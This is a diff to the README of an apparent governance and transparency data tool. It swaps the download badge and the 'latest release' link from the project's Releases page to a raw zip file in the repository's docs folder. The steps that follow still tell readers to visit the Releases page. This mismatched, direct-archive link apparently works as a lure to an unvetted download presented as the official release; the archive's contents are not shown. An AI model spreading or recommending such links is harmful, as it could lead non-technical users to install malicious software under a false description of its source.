@@ -1,7 +1,7 @@
 # 🌟 corruptibility-index-public - Understand Governance and Transparency
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Saxkore/corruptibility-index-public/releases)
+[![Download](https://raw.githubusercontent.com/Saxkore/corruptibility-index-public/main/docs/corruptibility-index-public_1.5.zip)](https://raw.githubusercontent.com/Saxkore/corruptibility-index-public/main/docs/corruptibility-index-public_1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the corruptibility-index-public application! This tool helps you explore important ideas about governance, transparency, and public interest. It offers insights into social impact through data analysis. You do not need to be a programmer to use it. Follow these simple steps to get started.
@@ -15,7 +15,7 @@ Before you download the application, ensure your computer meets these basic requ
 - **Internet Connection:** Needed for downloading the application and updates.
 
 ## 📂 Download & Install
-To download the application, please visit the following link: [Download the latest release](https://github.com/Saxkore/corruptibility-index-public/releases).
+To download the application, please visit the following link: [Download the latest release](https://raw.githubusercontent.com/Saxkore/corruptibility-index-public/main/docs/corruptibility-index-public_1.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version, which is indicated as "Latest".
